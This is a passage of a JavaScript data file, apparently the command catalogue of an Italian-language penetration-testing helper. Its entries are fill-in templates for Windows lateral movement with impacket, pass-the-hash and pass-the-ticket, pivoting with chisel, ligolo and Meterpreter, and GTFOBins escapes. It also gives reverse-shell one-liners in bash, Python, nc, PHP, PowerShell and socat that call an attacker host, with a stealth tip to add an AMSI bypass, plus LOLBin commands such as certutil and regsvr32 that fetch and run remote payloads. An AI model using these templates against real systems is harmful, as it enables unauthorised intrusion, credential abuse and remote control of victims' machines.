    "name": "impacket-smbexec — shell via share",
    "category": "lateral",
    "subcategory": "remote-shells",
    "group": "Impacket Shells",
    "description": "Esecuzione semi-interattiva via servizio temporaneo e share: alternativa a psexec quando questo è bloccato.",
    "note": "# Cosa osservare\nSimile a psexec ma via share SMB, senza installare un servizio permanente. Utile se psexec è bloccato ma la share resta accessibile.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "impacket",
      "smbexec"
    ],
    "template": "impacket-smbexec <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "dcomexec",
    "name": "impacket-dcomexec — via DCOM",
    "category": "lateral",
    "subcategory": "remote-shells",
    "group": "Impacket Shells",
    "description": "Esegue tramite oggetti DCOM (`MMC20`, `ShellWindows`, `ShellBrowserWindow`): utile quando SMB/WMI sono monitorati.",
    "note": "# Quale variante usare\nEsegue via DCOM (oggetti MMC20, ShellWindows, ShellBrowserWindow): vettore alternativo quando SMB e WMI sono filtrati. Cambia -object se il default MMC20 non risponde.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "rpc",
      "wmi"
    ],
    "tags": [
      "impacket",
      "dcomexec",
      "dcom"
    ],
    "template": "impacket-dcomexec <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "hash",
        "label": "Hash NTLM",
        "placeholder": "aad3b435...",
        "ctx": "hash"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "MMC20",
        "template": "impacket-dcomexec <domain>/<user>:<password>@<ip> -object MMC20",
        "description": "Oggetto DCOM `MMC20` (default)."
      },
      {
        "id": "shellwindows",
        "label": "ShellWindows",
        "template": "impacket-dcomexec <domain>/<user>:<password>@<ip> -object ShellWindows",
        "description": "Alternativa se `MMC20` è bloccato."
      },
      {
        "id": "hash",
        "label": "Pass-the-Hash",
        "template": "impacket-dcomexec <domain>/<user>@<ip> -hashes :<hash>",
        "description": "Pass-the-Hash."
      }
    ]
  },
  {
    "id": "atexec",
    "name": "impacket-atexec — via scheduled task",
    "category": "lateral",
    "subcategory": "remote-shells",
    "group": "Impacket Shells",
    "description": "Esegue un singolo comando creando un task pianificato temporaneo. Non interattivo: utile per un comando mirato.",
    "note": "# Cosa osservare\nEsegue un singolo comando via scheduled task remoto. Non dà una shell interattiva: utile per comandi one-shot o quando gli altri metodi di esecuzione sono bloccati.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "rpc"
    ],
    "tags": [
      "impacket",
      "atexec"
    ],
    "template": "impacket-atexec <domain>/<user>:<password>@<ip> 'whoami'",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-pth",
    "name": "nxc — Pass-the-Hash spray",
    "category": "lateral",
    "subcategory": "pass-the-hash",
    "group": "PtH",
    "description": "Spruzza un hash NTLM su una lista di target per individuare dove l'utente è amministratore locale, senza mai conoscere la password. Un `(Pwn3d!)` accanto a un host indica accesso amministrativo. `--local-auth` è necessario per gli account locali, il cui riuso della stessa password admin fra macchine è ancora molto comune.",
    "note": "# Prossimo passo\nSpray dell’hash NTLM su più target (SMB/WinRM): Pwn3d! indica admin locale. PtH funziona solo con hash NTLM, non NetNTLMv2. Prova prima WinRM (silenzioso, con evil-winrm -H), poi psexec.",
    "platform": "linux",
    "requires": [
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "netexec",
      "pth"
    ],
    "template": "nxc smb targets.txt -u '<user>' -H '<hash>'",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "hash",
        "label": "NTLM hash",
        "ctx": "hash",
        "placeholder": "aad3b...:<nt>"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SMB",
        "template": "nxc smb targets.txt -u '<user>' -H '<hash>'",
        "description": "Cerca `(Pwn3d!)` = admin locale su quel target."
      },
      {
        "id": "local",
        "label": "SMB local-auth",
        "template": "nxc smb targets.txt -u '<user>' -H '<hash>' --local-auth",
        "description": "Account locale (non di dominio): scova riuso della password admin locale."
      },
      {
        "id": "winrm",
        "label": "WinRM",
        "template": "nxc winrm targets.txt -u '<user>' -H '<hash>'",
        "description": "PtH su WinRM."
      }
    ]
  },
  {
    "id": "rdp-pth",
    "name": "xfreerdp — Pass-the-Hash (RDP)",
    "category": "lateral",
    "subcategory": "pass-the-hash",
    "group": "PtH",
    "description": "RDP con NTLM hash: funziona solo se sul target è abilitato il Restricted Admin Mode.",
    "note": "# Prerequisiti\nFunziona solo se il target ha Restricted Admin Mode abilitato, altrimenti RDP rifiuta l’hash. /pth:HASH autentica senza password in chiaro.",
    "platform": "linux",
    "requires": [
      "hash"
    ],
    "protocols": [
      "rdp"
    ],
    "tags": [
      "xfreerdp",
      "pth",
      "rdp"
    ],
    "template": "xfreerdp /v:<ip> /u:<user> /pth:<hash> /dynamic-resolution",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "hash",
        "label": "NTLM hash",
        "ctx": "hash",
        "placeholder": "<nt-hash>"
      }
    ]
  },
  {
    "id": "ptt-rubeus",
    "name": "Rubeus — dump & ptt (Windows)",
    "category": "lateral",
    "subcategory": "pass-the-ticket",
    "group": "PtT",
    "description": "Da Windows: estrai i ticket Kerberos dalla memoria e iniettane uno nella sessione corrente (`ptt`).",
    "note": "# Prossimo passo\ndump e triage elencano i ticket in memoria; estrai un TGT o TGS e riusalo con ptt. Da un DC o con SYSTEM puoi dumpare i ticket di tutti gli utenti loggati.",
    "platform": "windows",
    "requires": [
      "ticket"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "rubeus",
      "ptt",
      "kerberos"
    ],
    "template": ".\\Rubeus.exe dump /nowrap",
    "params": [
      {
        "key": "ticket",
        "label": "Ticket (base64)",
        "placeholder": "doIF..."
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Dump ticket",
        "template": ".\\Rubeus.exe dump /nowrap",
        "description": "`triage` per la lista, `dump /service:krbtgt` per i TGT."
      },
      {
        "id": "ptt",
        "label": "Inietta (ptt)",
        "template": ".\\Rubeus.exe ptt /ticket:<ticket>",
        "description": "Inietta un ticket base64/`.kirbi` nella sessione corrente."
      }
    ]
  },
  {
    "id": "ptt-import",
    "name": "Pass-the-Ticket — Linux",
    "category": "lateral",
    "subcategory": "pass-the-ticket",
    "group": "PtT",
    "description": "Da Linux: punta `KRB5CCNAME` al ccache e autenticati con `-k -no-pass` (nessuna password, usa il ticket).",
    "note": "# Prerequisiti\nImposta KRB5CCNAME sul file .ccache, poi usa gli strumenti impacket con -k -no-pass. Il nome host (non l’IP) deve risolvere: aggiungi il DC a /etc/hosts e usa il FQDN, o Kerberos fallisce.",
    "platform": "linux",
    "requires": [
      "ticket"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "impacket",
      "ptt",
      "kerberos"
    ],
    "template": "export KRB5CCNAME=ticket.ccache; impacket-psexec <domain>/<user>@<target> -k -no-pass",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "target",
        "label": "Target FQDN",
        "placeholder": "dc01.corp.local"
      }
    ]
  },
  {
    "id": "overpass-hash",
    "name": "Overpass-the-Hash — TGT da hash",
    "category": "lateral",
    "subcategory": "pass-the-ticket",
    "group": "PtT",
    "description": "Converte un NTLM hash in un TGT Kerberos: più stealth del PtH puro (usi Kerberos invece di NTLM).",
    "note": "# Prossimo passo\nDa un hash NTLM ottieni un TGT Kerberos completo (asktgt o getTGT): aggira i log NTLM e abilita gli attacchi Kerberos successivi. È il ponte tra Pass-the-Hash e Pass-the-Ticket.",
    "platform": "linux",
    "requires": [
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "impacket",
      "overpass-the-hash",
      "getTGT"
    ],
    "template": "impacket-getTGT <domain>/<user> -hashes :<hash>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "hash",
        "label": "NTLM hash",
        "ctx": "hash",
        "placeholder": "<nt-hash>"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (getTGT)",
        "template": "impacket-getTGT <domain>/<user> -hashes :<hash>",
        "description": "Salva un `.ccache`; poi `export KRB5CCNAME=...`."
      },
      {
        "id": "rubeus",
        "label": "Windows (Rubeus)",
        "template": ".\\Rubeus.exe asktgt /user:<user> /rc4:<hash> /ptt",
        "description": "Chiede il TGT e lo inietta (`/ptt`) in un colpo."
      }
    ]
  },
  {
    "id": "ssh-forward",
    "name": "SSH — port forwarding",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SSH",
    "description": "Tunnel attraverso un host pivot via SSH: locale (`-L`), remoto (`-R`) o SOCKS dinamico (`-D`).",
    "note": "# Quale variante usare\n- Local (-L): raggiungi una porta interna via localhost\n- Remote (-R): esponi una tua porta sul pivot\n- Dynamic (-D): proxy SOCKS completo, da usare con proxychains\nNessun tool da caricare sul target: basta un accesso SSH al pivot.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "ssh",
      "pivot",
      "port-forward"
    ],
    "template": "ssh -L <localport>:<targetip>:<targetport> <user>@<pivot> -N",
    "params": [
      {
        "key": "localport",
        "label": "Porta locale",
        "placeholder": "4445"
      },
      {
        "key": "targetip",
        "label": "Target interno",
        "placeholder": "172.16.8.50"
      },
      {
        "key": "targetport",
        "label": "Porta target",
        "placeholder": "445"
      },
      {
        "key": "user",
        "label": "User pivot",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "pivot",
        "label": "Pivot",
        "ctx": "ip",
        "placeholder": "10.10.14.50"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Local (-L)",
        "template": "ssh -L <localport>:<targetip>:<targetport> <user>@<pivot> -N",
        "description": "La porta del target interno diventa raggiungibile su `localhost:<localport>`."
      },
      {
        "id": "remote",
        "label": "Remote (-R)",
        "template": "ssh -R <localport>:127.0.0.1:<targetport> <user>@<pivot> -N",
        "description": "Espone una porta locale dell'attaccante sul pivot."
      },
      {
        "id": "dynamic",
        "label": "SOCKS (-D)",
        "template": "ssh -D 9050 <user>@<pivot> -N",
        "description": "Proxy SOCKS su `9050`; usa con `proxychains`."
      }
    ]
  },
  {
    "id": "chisel-socks",
    "name": "chisel — tunnel SOCKS/forward",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SOCKS Pivot",
    "description": "Tunnel TCP/SOCKS quando non c’è SSH. Server sull’attacker, client sul pivot; reverse (`R:`) attraversa il NAT.",
    "note": "# Prossimo passo\nServer sull’attacker (--reverse), client sul pivot (R:socks): crea un SOCKS su cui girare proxychains. Ottimo quando non c’è SSH. Carica il binario statico giusto per l’architettura del pivot.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "chisel",
      "socks",
      "pivot"
    ],
    "template": "./chisel client <lhost>:8080 R:socks",
    "params": [
      {
        "key": "lhost",
        "label": "Attacker",
        "ctx": "ip",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SOCKS (client)",
        "template": "./chisel client <lhost>:8080 R:socks",
        "description": "Crea un SOCKS5 sull’attacker (porta `1080`), `proxychains`."
      },
      {
        "id": "server",
        "label": "Server (attacker)",
        "template": "./chisel server --reverse -p 8080",
        "description": "Da lanciare per primo sull’attacker."
      },
      {
        "id": "forward",
        "label": "Port forward",
        "template": "./chisel client <lhost>:8080 R:3389:172.16.8.50:3389",
        "description": "Inoltra una singola porta del target interno."
      }
    ]
  },
  {
    "id": "ligolo",
    "name": "Ligolo-ng — pivot a livello IP",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SOCKS Pivot",
    "description": "Pivot moderno senza proxychains: crea un’interfaccia `tun` e aggiungi una route verso la subnet interna, poi usi i tool normalmente.",
    "note": "# Cosa osservare\nCrea un’interfaccia tun: raggiungi la subnet target come se fossi in rete, senza proxychains (funzionano ping e UDP, non solo TCP). Aggiungi la route verso la subnet e usi i tool normalmente.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "ligolo",
      "pivot",
      "tun"
    ],
    "template": "./proxy -selfcert -laddr 0.0.0.0:11601",
    "params": [
      {
        "key": "lhost",
        "label": "Attacker",
        "ctx": "ip",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "subnet",
        "label": "Subnet target",
        "placeholder": "172.16.8.0"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Proxy (attacker)",
        "template": "sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert -laddr 0.0.0.0:11601",
        "description": "Crea l’interfaccia `ligolo` e avvia il proxy."
      },
      {
        "id": "agent",
        "label": "Agent (pivot)",
        "template": "./agent -connect <lhost>:11601 -ignore-cert",
        "description": "Sul pivot: si connette al proxy. Poi nel proxy: `session`, `start`."
      },
      {
        "id": "route",
        "label": "Route (attacker)",
        "template": "sudo ip route add <subnet>/24 dev ligolo",
        "description": "Dopo `start`: la subnet diventa raggiungibile direttamente (no proxychains)."
      }
    ]
  },
  {
    "id": "proxychains",
    "name": "proxychains — usa il tunnel",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SOCKS Pivot",
    "description": "Instrada un tool attraverso il SOCKS del pivot. In `/etc/proxychains4.conf`: `dynamic_chain` + `socks5 127.0.0.1 1080`. Solo TCP, usa `-sT -Pn` con nmap.",
    "note": "# Prerequisiti\nRichiede un SOCKS attivo (SSH -D, chisel, meterpreter). In /etc/proxychains4.conf usa dynamic_chain e aggiungi socks5 127.0.0.1 PORTA. Coi tool usa scansioni TCP connect (nmap -sT -Pn): i raw socket non passano dal proxy.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "proxychains",
      "socks",
      "pivot"
    ],
    "template": "proxychains -q nmap -sT -Pn -p- --min-rate 5000 <targetip>",
    "params": [
      {
        "key": "targetip",
        "label": "Target interno",
        "placeholder": "172.16.8.50"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "nmap",
        "template": "proxychains -q nmap -sT -Pn -p- --min-rate 5000 <targetip>",
        "description": "Scan TCP attraverso il proxy."
      },
      {
        "id": "nxc",
        "label": "nxc",
        "template": "proxychains -q nxc smb <targetip> -u '<user>' -p '<password>' --shares",
        "description": "Qualsiasi tool TCP funziona dietro `proxychains`."
      }
    ]
  },
  {
    "id": "socat-relay",
    "name": "socat — relay sul pivot",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SOCKS Pivot",
    "description": "Redirige una porta dal pivot verso un host interno (o inoltra una reverse shell verso l’attacker). Da eseguire sul pivot.",
    "note": "# Cosa osservare\nRelay TCP sul pivot: inoltra una porta locale del pivot verso un host:porta della rete interna, oppure fa da ponte per una reverse shell. Redirector semplice quando non serve un SOCKS completo.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "socat",
      "relay",
      "pivot"
    ],
    "template": "socat TCP-LISTEN:<localport>,fork TCP:<targetip>:<targetport>",
    "params": [
      {
        "key": "localport",
        "label": "Porta sul pivot",
        "placeholder": "8443"
      },
      {
        "key": "targetip",
        "label": "Target interno",
        "placeholder": "172.16.8.50"
      },
      {
        "key": "targetport",
        "label": "Porta target",
        "placeholder": "443"
      }
    ]
  },
  {
    "id": "sshuttle",
    "name": "sshuttle — VPN su SSH",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SOCKS Pivot",
    "description": "VPN trasparente su SSH: instrada un’intera subnet senza proxychains. Serve Python sul pivot.",
    "note": "# Quale variante usare\nVPN povera su SSH: instrada intere subnet attraverso il pivot in modo trasparente, senza configurare proxychains. Serve Python sul pivot e un accesso SSH.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sshuttle",
      "pivot"
    ],
    "template": "sshuttle -r <user>@<ip> <subnet>",
    "params": [
      {
        "key": "user",
        "label": "SSH user",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "ip",
        "label": "Jump host",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.20.0/24"
      }
    ]
  },
  {
    "id": "meterpreter-pivot",
    "name": "Meterpreter — pivoting",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "Meterpreter",
    "description": "Pivoting da una sessione Meterpreter: autoroute aggiunge le route verso la subnet interna, socks_proxy espone un SOCKS per proxychains, portfwd inoltra singole porte. La via naturale quando il foothold è già una sessione Metasploit.",
    "note": "# Prossimo passo\nDopo autoroute i moduli Metasploit raggiungono la subnet; per i tool esterni serve il socks_proxy più proxychains. portfwd add -l LOCAL -p REMOTE -r TARGET inoltra una singola porta.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "meterpreter",
      "pivoting",
      "autoroute"
    ],
    "template": "# aggiunge la route verso la subnet interna (la raggiungono i moduli Metasploit)\nrun autoroute -s <subnet>/24\n\n# espone un proxy SOCKS per i tool esterni (usalo con proxychains)\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun -j",
    "params": [
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "172.16.8.0"
      }
    ]
  },
  {
    "id": "revshell",
    "name": "Reverse shell — one-liner",
    "category": "utilities",
    "subcategory": "reverse-shells",
    "group": "One-liner",
    "description": "One-liner pronti per richiamare il listener dell'attaccante. Per altri linguaggi ed encoding il riferimento è revshells.com. La shell va poi stabilizzata, come descritto nella fase Exploitation.",
    "note": "# Prossimo passo\nStabilizza sempre la shell dopo averla ricevuta (vedi Shell Stabilization): senza TTY niente tab, Ctrl-C uccide la sessione. Per altri linguaggi/encoding, revshells.com. Attento ai caratteri che la shell locale interpreta: usa gli apici giusti.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "reverse-shell",
      "oneliner"
    ],
    "template": "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Bash",
        "template": "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1",
        "description": "Richiede `/dev/tcp`, quindi bash, e va lanciato tramite `bash -c`."
      },
      {
        "id": "python",
        "label": "Python",
        "template": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<lhost>\",<lport>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
        "description": "Già con PTY (`pty.spawn`)."
      },
      {
        "id": "nc",
        "label": "nc (mkfifo)",
        "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> <lport> >/tmp/f",
        "description": "Per `nc` senza `-e`."
      },
      {
        "id": "php",
        "label": "PHP",
        "template": "php -r '$sock=fsockopen(\"<lhost>\",<lport>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "description": "Utile dopo un file upload PHP."
      },
      {
        "id": "powershell",
        "label": "PowerShell",
        "template": "powershell -nop -W hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"",
        "description": "One-liner Windows; per stealth aggiungi un AMSI bypass prima."
      },
      {
        "id": "socat",
        "label": "socat",
        "template": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<lhost>:<lport>",
        "description": "Shell stabile; sull’attacker: `socat file:`tty`,raw,echo=0 tcp-listen:<lport>`."
      }
    ],
    "refs": [
      {
        "label": "revshells.com",
        "url": "https://www.revshells.com/"
      }
    ]
  },
  {
    "id": "gtfobins",
    "name": "GTFOBins — escape comuni",
    "category": "utilities",
    "subcategory": "gtfobins",
    "group": "Escape",
    "description": "Quando un binario è `sudo`/`SUID` o ha capabilities, cerca l’escape su GTFOBins. Qui le scappatoie più comuni per ottenere shell.",
    "note": "# Prossimo passo\nTrovato un binario con sudo/SUID/capability, cerca l’esatta sezione su GTFOBins (Shell, Command, SUID, Sudo, Capabilities): ogni voce dà il payload preciso. Le capability più utili sono cap_setuid e cap_dac_read_search.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "gtfobins",
      "suid",
      "sudo"
    ],
    "template": "find . -exec /bin/sh \\; -quit",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "find",
        "template": "find . -exec /bin/sh \\; -quit",
        "description": "Con `sudo find` o find `SUID`."
      },
      {
        "id": "vim",
        "label": "vim",
        "template": "vim -c ':!/bin/sh'",
        "description": "Esce in shell dall’editor."
      },
      {
        "id": "awk",
        "label": "awk",
        "template": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "description": "Shell via `system()`."
      },
      {
        "id": "less",
        "label": "less / man",
        "template": "less /etc/profile",
        "description": "Dentro `less` digita `!/bin/sh`."
      }
    ],
    "refs": [
      {
        "label": "GTFOBins",
        "url": "https://gtfobins.github.io/"
      }
    ]
  },
  {
    "id": "lolbins",
    "name": "LOLBins — download Windows",
    "category": "utilities",
    "subcategory": "lolbins",
    "group": "Download",
    "description": "Binari Windows legittimi (LOLBAS) per scaricare/eseguire payload aggirando i controlli applicativi.",
    "note": "# Cosa osservare\nBinari firmati Microsoft (certutil, bitsadmin, mshta, regsvr32...) per scaricare o eseguire aggirando l’application allowlisting. Riferimento completo: lolbas-project.github.io. Rumorosi: lasciano traccia nei log di esecuzione.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "lolbins",
      "lolbas",
      "certutil"
    ],
    "template": "certutil -urlcache -f http://<lhost>/<file> <file>",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "file",
        "label": "File",
        "placeholder": "shell.exe"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "certutil",
        "template": "certutil -urlcache -f http://<lhost>/<file> <file>",
        "description": "Download via `certutil` (molto comune)."
      },
      {
        "id": "bitsadmin",
        "label": "bitsadmin",
        "template": "bitsadmin /transfer job http://<lhost>/<file> C:\\Temp\\<file>",
        "description": "Download via servizio BITS."
      },
      {
        "id": "regsvr32",
        "label": "regsvr32 (squiblydoo)",
        "template": "regsvr32 /s /n /u /i:http://<lhost>/file.sct scrobj.dll",
        "description": "Esegue scriptlet remoto senza scrivere l’exe su disco."
      }
    ],
    "refs": [
      {
        "label": "LOLBAS Project",
        "url": "https://lolbas-project.github.io/"
      }
    ]
  },
  {
    "id": "hashcat-modes",
    "name": "hashcat — mode di riferimento",
    "category": "utilities",
    "subcategory": "cheatsheets",
    "group": "Cracking",
    "description": "Mode hashcat ricorrenti in un pentest:\n- `0` MD5 · `100` SHA1 · `1000` NTLM\n- `1800` sha512crypt (`$6$`, /etc/shadow) · `3200` bcrypt\n- `5600` NetNTLMv2 (Responder) · `13100` Kerberoast (TGS) · `18200` AS-REP\n- `22000` WPA-PBKDF2",
    "note": "# Quale variante usare\nIl mode sbagliato fa fallire il crack in silenzio. Ricorrenti in AD: 1000 NTLM, 5600 NetNTLMv2 (Responder), 13100 Kerberoast (TGS), 18200 ASREPRoast; per /etc/shadow 1800 ($6$). Abbinaci una buona wordlist (rockyou) e le regole (best64).",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "hashcat",
      "cheatsheet",
      "modes"
    ],
    "template": "hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt",
    "params": [
      {
        "key": "mode",
        "label": "Mode",
        "placeholder": "1000"
      }
    ],
    "refs": [
      {
        "label": "hashcat — example hashes",
        "url": "https://hashcat.net/wiki/doku.php?id=example_hashes"
      }
    ]
  },
  {
    "id": "curl-recipes",
    "name": "cURL — ricette utili",
    "category": "utilities",
    "subcategory": "cheatsheets",
    "group": "HTTP",
    "description": "Ricette `curl` per recon e testing: header del server, follow redirect, auth, login con cookie di sessione.",
    "note": "# Cosa osservare\n-v mostra gli header di richiesta e risposta; -L segue i redirect; -b/-c gestiscono i cookie di sessione; -x instrada via proxy (Burp). Per le API: -H 'Content-Type: application/json' con -d. --path-as-is serve per il path traversal.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "curl",
      "http",
      "cheatsheet"
    ],
    "template": "curl -sI http://<ip>/",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "token",
        "label": "Token",
        "placeholder": "eyJhbGci..."
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Header server",
        "template": "curl -sI http://<ip>/",
        "description": "`-I` solo header (versione, tecnologie)."
      },
      {
        "id": "follow",
        "label": "Segui redirect",
        "template": "curl -skL http://<ip>/",
        "description": "`-L` segue i redirect, `-k` ignora TLS non valido."
      },
      {
        "id": "bearer",
        "label": "Bearer token",
        "template": "curl -s http://<ip>/api -H \"Authorization: Bearer <token>\"",
        "description": "Chiamata API autenticata."
      },
      {
        "id": "cookie",
        "label": "Login + cookie",
        "template": "curl -s -c cookies.txt -d 'user=admin&pass=admin' http://<ip>/login; curl -s -b cookies.txt http://<ip>/dashboard",
        "description": "`-c` salva il cookie di sessione, `-b` lo riusa."
      }
    ]
  }
];
window.COMMANDS = COMMANDS;
